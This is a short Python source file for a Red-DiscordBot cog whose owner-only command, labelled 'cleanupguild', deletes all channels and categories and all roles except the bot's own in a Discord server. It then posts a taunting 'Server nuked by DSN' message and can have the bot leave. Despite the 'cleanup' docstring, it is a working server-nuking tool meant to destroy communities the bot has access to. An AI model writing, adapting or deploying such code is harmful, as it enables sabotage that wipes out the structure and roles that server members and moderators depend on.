import discord
from redbot.core import commands

class CleanupGuild(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.guild_only()
    @commands.is_owner()
    async def cleanupguild(self, ctx, leave_after_cleanup: str = "no", category_title: str = "General Category", channel_title: str = "general"):
        """
        Cleanup the guild by:
        1. Removing all channels and categories
        2. Adding one category and channel with the specified names
        3. Sending a cleanup message in the new channel
        4. Deleting all roles except the bot's admin role
        5. Leaving the server if 'leave_after_cleanup' is 'yes'
        """
        guild = ctx.guild

        # Remove all channels and categories
        for channel in guild.channels:
            await channel.delete()

        # Add one category with the specified name
        category = await guild.create_category(category_title)

        # Add one text channel inside the category
        channel = await guild.create_text_channel(channel_title, category=category)

        # Send a cleanup message in the new channel
        await channel.send("Server nuked by DSN. Good luck fixing this mess! *hugz*")

        # Get the bot's admin role (the top role)
        bot_role = guild.get_member(self.bot.user.id).top_role

        # Delete all roles except the bot's admin role
        for role in guild.roles:
            if role != bot_role:
                try:
                    await role.delete(reason="CleanupGuild command")
                except discord.errors.NotFound:
                    pass  # Role has already been deleted

        # Leave the server if 'leave_after_cleanup' is 'yes'
        if leave_after_cleanup.lower() == "yes":
            await guild.leave()

def setup(bot):
    bot.add_cog(CleanupGuild(bot))
